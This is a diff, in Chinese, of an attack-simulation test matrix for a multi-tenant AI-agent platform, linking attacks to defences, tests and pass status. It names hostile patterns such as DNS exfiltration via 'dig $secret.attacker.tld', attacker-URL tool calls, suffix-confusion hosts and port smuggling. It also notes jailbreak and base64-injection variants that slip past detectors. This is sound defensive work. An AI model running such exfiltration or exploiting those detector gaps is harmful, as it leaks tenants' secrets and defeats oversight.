@@ -11,7 +11,7 @@
 - [`13-safety-overview.md`](13-safety-overview.md) —— 三层模型
 - [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md) —— A 和 G 类
 - [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md) —— B4、C、D 类（内容检查）
-- [`16-egress-control-architecture.md`](16-egress-control-architecture.md) —— D4 以及 B 的部分（网络外泄）
+- [`16-egress-control-architecture.md`](16-egress-control-architecture.md) —— D4、I 类（网络 egress / 网关面）以及 B 的部分（网络外泄）
 - [`6-auth-architecture.md`](6-auth-architecture.md)、[`4-multi-tenant-architecture.md`](4-multi-tenant-architecture.md) —— E 类
 
 ---
@@ -28,6 +28,8 @@
 ## A. 容器逃逸 / 沙箱突破
 
 由 [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md) 支撑。
+
+下方的 Docker `HostConfig` 契约在 Kubernetes 上同样成立（`ROLEMESH_CONTAINER_RUNTIME=k8s`）：同一个 `ContainerSpec` 被映射为 pod `securityContext` + pod-spec 字段，由 `test_A_container_escape_k8s_spec.py` 钉点（drop ALL caps、`readOnlyRootFilesystem`、`allowPrivilegeEscalation:false`、seccomp `RuntimeDefault`、`runAsNonRoot`、`automountServiceAccountToken:false`，以及 default-deny / gateway-only egress 所依赖的 agent NetworkPolicy 标签契约）。
 
 | ID | 攻击 | 防御 | 测试 | 状态 |
 |---|---|---|---|---|
@@ -78,7 +80,7 @@
 | D1 | LLM 输出中的 PII（SSN / CC） | `pii.regex` 检查 | `test_D_data_exfil::test_D1_*` | ✅ |
 | D2 | 工具调用至攻击者 URL（dict 字段） | `domain_allowlist` 检查 | `test_D2_tool_call_to_attacker_url_blocked` | ✅ |
 | D3 | URL 隐藏在 Bash 命令字符串内 | `domain_allowlist` 遍历字符串叶节点 | `test_D3_url_in_bash_command_string_detected` | ✅ |
-| D4 | 通过 `dig $secret.attacker.tld` 进行 DNS 外泄 | 权威 DNS 解析器 + 每租户允许列表（EC-2） | `test_D4_dns_exfiltration_prevented` | 该行历史上为 ❌ xfail，等待 EC-2；EC-2 已落地（参见 [`16-egress-control-architecture.md`](16-egress-control-architecture.md)）—— 当前状态以测试结果为准 |
+| D4 | 通过 `dig $secret.attacker.tld` 进行 DNS 外泄 | egress 网关权威 DNS 解析器 —— `enforce` 模式 + 空的**平台**允许列表，将任何未在白名单内的名字 NXDOMAIN（EC-2）；DNS 是平台级策略，非每租户（参见 [`16-egress-control-architecture.md`](16-egress-control-architecture.md)） | `test_D4_dns_exfiltration_blocked_by_egress_dns_policy`、`test_D4_dns_allowlist_is_positive_and_subdomain_safe` | ✅（此处钉策略契约；网关 socket 路径在 `tests/egress/test_dns_*`） |
 | D5 | Pastebin / transfer.sh 数据投放 | `domain_allowlist`（正向允许列表） | `test_D5_paste_services_blocked`（4 个主机） | ✅ |
 
 ---
@@ -87,11 +89,13 @@
 
 由 [`4-multi-tenant-architecture.md`](4-multi-tenant-architecture.md)（双池 RLS）和 [`6-auth-architecture.md`](6-auth-architecture.md)（IPC 信任边界）支撑。
 
+最初的 E1/E2 打在 approval engine 上，已随 human-approval 子系统一起删除。其防御——信任来自 coworker 查询的权威租户，绝不信任负载中的声明——现在存活于 safety RPC / 事件面（`SafetyRpcServer._handle_request_inner`、`safety/subscriber.py`）；测试在那里钉点。
+
 | ID | 攻击 | 防御 | 测试 | 状态 |
 |---|---|---|---|---|
-| E1 | 在 NATS 负载中伪造 tenantId | Engine `_tenant_matches` 守卫 | `test_E_tenant_isolation::test_E1_*` | ✅ |
-| E2 | 伪造属于另一租户的 coworkerId | IPC 分发器使用源 coworker 的权威租户 | `test_E2_forged_coworker_id_dropped` | ✅ |
-| E6 | NATS subject 侧信道（A 读取 B 的任务） | NATS account-per-tenant（未实现） | `test_E6_nats_subject_sidechannel_isolation` | ❌ xfail（NATS ACL 缺口） |
+| E1 | 在请求负载中伪造 tenantId | 当声明的租户 ≠ coworker 的权威租户时 `SafetyRpcServer` 丢弃 | `test_E_tenant_isolation::test_E1_forged_tenant_id_dropped` | ✅ |
+| E2 | 伪造属于另一租户的 coworkerId | 守卫锚定 coworker 的权威租户，而非声明 | `test_E2_forged_coworker_id_dropped`、`test_E2b_unknown_coworker_id_dropped` | ✅ |
+| E6 | NATS subject 侧信道 —— *一致的*伪造（victim coworker_id **加**匹配的 tenant_id）经核心 NATS | NATS account-per-tenant / 租户范围凭据（未实现） | `test_E6_consistent_cross_tenant_forge_is_rejected` | ❌ xfail（NATS ACL 缺口） |
 
 ---
 
@@ -122,20 +126,36 @@
 
 ---
 
-## 计数汇总（快照，2026-04-22）
+## I. 网络 egress（网关面）
 
-下方计数取自矩阵首次草拟之时。运行 `pytest tests/attack_sim/ -v` 获取实时情况。
+第三道防御层：每一次对外 TCP/HTTP(S) 尝试都经转发代理收口，每一次原始 DNS 查询都经网关的权威解析器，两者都执行**正向**允许列表。由 [`16-egress-control-architecture.md`](16-egress-control-architecture.md) 支撑。socket / CONNECT 管线由 `tests/egress/` 覆盖；下列各行是覆盖在策略契约之上的攻击叙事钉点，经真实网关 seam（`make_egress_domain_check`、`GlobalDnsPolicy`）驱动。
+
+| ID | 攻击 | 防御 | 测试 | 状态 |
+|---|---|---|---|---|
+| I1 | 转发代理 CONNECT 到非白名单攻击者主机（含后缀混淆 `github.com.attacker.tld`） | `egress.domain_rule` 报告无匹配 → 聚合器 block | `test_I_egress_gateway::test_I1_*`（4 个主机） | ✅ |
+| I2 | 端口夹带 —— 白名单 SNI 但非白名单端口（`*.github.com` 上的 SSH） | 规则上的 `ports` 端口约束 | `test_I2_allowlisted_name_on_wrong_port_not_matched` | ✅ |
+| I3 | 畸形 egress 规则配置（键名拼错、空列表、`extra`、非 dict） | 适配器 fail **closed** —— 任何配置错误 ⇒ 无匹配 | `test_I3_malformed_config_fails_closed`（5 种用例） | ✅ |
+| I4 | 空 / 截断的主机 | 空主机永不计为允许列表匹配 | `test_I4_empty_host_not_matched` | ✅ |
+| I5 | DNS 外泄默认姿态 / 拼错的解析器模式 | `GlobalDnsPolicy` `enforce` + 空允许列表；`from_env` 拒绝未知模式（fail-closed 启动） | `test_I5_*`（2） | ✅ |
+
+---
+
+## 计数汇总（快照，2026-06-25）
+
+下方计数取自本次更新之时。运行 `pytest tests/attack_sim/ -v` 获取实时情况。
 
 | 类别 | ✅ | ❌ xfail | 📝 docs-only | 🔧 manual-only |
 |---|---|---|---|---|
-| A. 容器 | 12 | 0 | 0 | 6 共享 |
+| A. 容器（Docker） | 12 | 0 | 0 | 6 共享 |
+| A. 容器（K8s） | 8 | 0 | 0 | 0 |
 | B. 密钥 | 10 | 1 | 1 | 1 |
 | C. Prompt 注入 | 7 | 0 | 3 | 0 |
-| D. 数据外泄 | 7 | 1 | 0 | 0 |
-| E. 租户隔离 | 2 | 1 | 0 | 0 |
+| D. 数据外泄 | 9 | 0 | 0 | 0 |
+| E. 租户隔离 | 4 | 1 | 0 | 0 |
 | G. DoS | 3 | 0 | 0 | 2 |
 | H. 配置 | 8 | 0 | 0 | 1 |
-| **合计** | **49** | **3** | **4** | **10** |
+| I. 网络 egress | 13 | 0 | 0 | 0 |
+| **合计** | **74** | **2** | **4** | **10** |
 
 ---
 
@@ -144,15 +164,15 @@
 当相应防御层落地后，下列项会成为"进展信号"：
 
 1. **B2 凭据代理枚举** —— 通过对凭据代理实施限流或按 agent 鉴权来关闭。
-2. **D4 DNS 外泄** —— EC-2 已落地，带权威 DNS 解析器 + 每租户允许列表（参见 [`16-egress-control-architecture.md`](16-egress-control-architecture.md)）；待测试重写以覆盖网关侧路径后，可以撤销该 xfail。
-3. **E6 NATS subject 侧信道** —— 通过 NATS account-per-tenant 或租户范围的 NATS 凭据来关闭。
+2. **E6 一致的跨租户身份伪造** —— safety 面守卫能拦住*不一致*的伪造（coworker_id 与 tenant_id 来自不同租户），但一个在核心 NATS 上呈现 victim 匹配的 coworker_id **加** tenant_id 的连接会被接受。通过 NATS account-per-tenant / 租户范围凭据来关闭，使一个连接根本无法代表另一租户发言。
+
+（D4 DNS 外泄此前在本清单上；EC-2 已交付权威 DNS 解析器，D4 现已是通过的测试 —— 参见 D / I 类。）
 
 ## 已文档化的限制（已评估，在 v1 中选择不防御）
 
 - **B4' 切分密钥** —— detect-secrets 基于模式 + 熵；LLM 作为扫描器的第二层可以捕捉这些。v1 不发布。
 - **C2 DAN-family 越狱** —— llm-guard 越狱检测器漏掉这些。已在测试中文档化为仅打印；当检测器或自定义检查能捕捉时再翻为 ✅。
 - **C4 base64 包装的注入** —— 模式检测器漏掉；需要基于 LLM 的扫描器。
-- **F6 Stop / proposal NATS 竞争** —— 孤儿 pending 行在 `auto_expire_minutes` 内被过期回收。完美回收的成本（一张 `cancelled_jobs` 追踪表）在 v1 中不值得。
 - **仅 runbook 的手动项** —— 需要实际运行的容器；规约级钉点在自动化测试中，运行时验证在 `scripts/verify-hardening.sh` 中。
 
 ---
